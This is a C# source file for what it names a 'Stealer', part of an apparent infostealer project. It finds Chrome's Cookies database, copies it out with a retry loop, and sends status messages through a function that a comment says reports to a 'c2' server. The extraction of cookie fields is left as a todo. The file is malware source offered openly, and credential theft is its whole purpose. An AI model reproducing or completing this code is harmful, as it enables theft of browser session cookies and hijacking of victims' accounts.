using System;
using System.IO;
using System.Threading;

namespace ZestyChips
{
    internal class Stealer
    {
        /*
        * Main entrypoint for the stealer to begin..
        */
        public static void Start()
        {
            Program.SendBase64EncodedData("Hello from the stealer!"); // test case success

            // steal chrome data
            Chrome();
        }

        /*
        * stealer functions for Chrome
        */
        private static void Chrome() {
            bool flag = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
            string result;
            if (flag) {
                result = "Chrome not found";
                Helpers.PrintInfo(result);
            } else {
                result = "Chrome found, copying..";
                Helpers.PrintInfo(result);
                for(;;) {
                    try {
                        // copy file to dest file name cc
                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc", true);
                        break;
                    } catch {
                        Thread.Sleep(10000); // sleep 10 seconds
                    }
                }

                // open connection to Cookies database and execute SQL query to extract some fields
                // .. todo
            }

            Program.SendBase64EncodedData(result); // for fun send to c2
        }
    }
}
